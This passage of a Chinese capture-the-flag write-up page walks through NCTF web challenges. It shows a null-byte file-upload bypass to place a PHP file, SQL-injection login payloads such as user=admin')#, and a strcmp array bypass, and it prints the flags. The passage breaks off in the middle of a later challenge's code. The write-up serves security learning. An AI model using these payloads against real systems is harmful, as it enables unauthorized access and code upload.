</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-16>16</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>Array
</span></span><span style=display:flex><span>(
</span></span><span style=display:flex><span>    [0] =&gt; .jpg
</span></span><span style=display:flex><span>    [1] =&gt; jpg
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>Upload: 1.jpg&lt;<span style=color:#f92672>br</span> /&gt;Type: text/plain&lt;<span style=color:#f92672>br</span> /&gt;Size: 0.0078125 Kb&lt;<span style=color:#f92672>br</span> /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
</span></span><span style=display:flex><span>  [&#34;dirname&#34;]=&gt;
</span></span><span style=display:flex><span>  string(9) &#34;./uploads&#34;
</span></span><span style=display:flex><span>  [&#34;basename&#34;]=&gt;
</span></span><span style=display:flex><span>  string(5) &#34;1.jpg&#34;
</span></span><span style=display:flex><span>  [&#34;extension&#34;]=&gt;
</span></span><span style=display:flex><span>  string(3) &#34;jpg&#34;
</span></span><span style=display:flex><span>  [&#34;filename&#34;]=&gt;
</span></span><span style=display:flex><span>  string(1) &#34;1&#34;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>br</span>&gt;必须上传成后缀名为php的文件才行啊！&lt;<span style=color:#f92672>br</span>&gt;&lt;/<span style=color:#f92672>body</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>当filename为1.php时返回如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>Array
</span></span><span style=display:flex><span>(
</span></span><span style=display:flex><span>    [0] =&gt; .php
</span></span><span style=display:flex><span>    [1] =&gt; php
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件
</span></span></code></pre></td></tr></table></div></div><p>观察源码为：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>文件上传&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;upload.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>enctype</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;multipart/form-data&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>label</span> <span style=color:#a6e22e>for</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>&gt;Filename:&lt;/<span style=color:#f92672>label</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dir&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/uploads/&#34;</span> /&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> /&gt; 
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>br</span> /&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Submit&#34;</span> /&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改</p><p><code>/uploads/</code>为<code>/uploads/1.php0x00</code>，然后file保持<code>1.jpg</code>，连起来后就是<code>/uploads/1.php%001.jpg</code>，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。）</p><h4 id=sql注入1>sql注入1<a hidden class=anchor aria-hidden=true href=#sql注入1>#</a></h4><blockquote><p>听说你也会注入？
地址： <a href=http://chinalover.sinaapp.com/index.php>题目地址</a></p></blockquote><p><em>nctf{ni_ye_hui_sql?}</em></p><p>在 <em><a href=http://chinalover.sinaapp.com/index.phps>http://chinalover.sinaapp.com/index.phps</a></em> 查看源码，核心部分如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_POST[<span style=color:#a6e22e>user</span>] <span style=color:#f92672>&amp;&amp;</span> $_POST[<span style=color:#a6e22e>pass</span>]) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#a6e22e>SAE_MYSQL_HOST_M</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>SAE_MYSQL_PORT</span>,<span style=color:#a6e22e>SAE_MYSQL_USER</span>,<span style=color:#a6e22e>SAE_MYSQL_PASS</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#a6e22e>SAE_MYSQL_DB</span>);
</span></span><span style=display:flex><span>  $user <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#a6e22e>user</span>]);
</span></span><span style=display:flex><span>  $pass <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>trim</span>($_POST[<span style=color:#a6e22e>pass</span>]));
</span></span><span style=display:flex><span>  $sql<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;select user from ctf where (user=&#39;&#34;</span><span style=color:#f92672>.</span>$user<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;) and (pw=&#39;&#34;</span><span style=color:#f92672>.</span>$pass<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;)&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;/br&gt;&#39;</span><span style=color:#f92672>.</span>$sql;
</span></span><span style=display:flex><span>  $query <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_fetch_array</span>(<span style=color:#a6e22e>mysql_query</span>($sql));
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>($query[<span style=color:#a6e22e>user</span>]<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;admin&#34;</span>) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>($query[<span style=color:#a6e22e>user</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#34;&lt;p&gt;You are not admin!&lt;/p&gt;&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $query[<span style=color:#a6e22e>user</span>];
</span></span></code></pre></td></tr></table></div></div><p>会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";</code> ，</p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式<code>#</code>注释到行尾，<code>/*bla*/</code>用于行间或多行注释，<code>-- </code>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个<code>\s</code>，也就是空格，TAB，换行符等。</p><p>所以本题可post <code>user=admin')-- -&amp;pass=123</code>或<code>user=admin')#&amp;pass=123</code>，</p><p>sql语句就变成<code>select user from ctf where (user='admin')#' and (pw='123')</code>,</p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h4 id=pass-checkhttpchinaloversinaappcomweb21><a href=http://chinalover.sinaapp.com/web21/>pass check</a><a hidden class=anchor aria-hidden=true href=#pass-checkhttpchinaloversinaappcomweb21>#</a></h4><p><em>nctf{strcmp_is_n0t_3afe}</em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-14>14</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$pass<span style=color:#f92672>=@</span>$_POST[<span style=color:#e6db74>&#39;pass&#39;</span>];
</span></span><span style=display:flex><span>$pass1<span style=color:#f92672>=***********</span>;<span style=color:#75715e>//被隐藏起来的密码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($pass))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>@!</span><span style=color:#a6e22e>strcmp</span>($pass,$pass1)){
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;flag:nctf{*}&#34;</span>;
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;the pass is wrong!&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;please input pass!&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为<code>pass[]=</code></p><h4 id=起名字真难>起名字真难<a hidden class=anchor aria-hidden=true href=#起名字真难>#</a></h4><p><em>nctf{follow_your_dream}</em></p><blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-21>21</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>noother_says_correct</span>($number)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        $one <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>(<span style=color:#e6db74>&#39;1&#39;</span>);
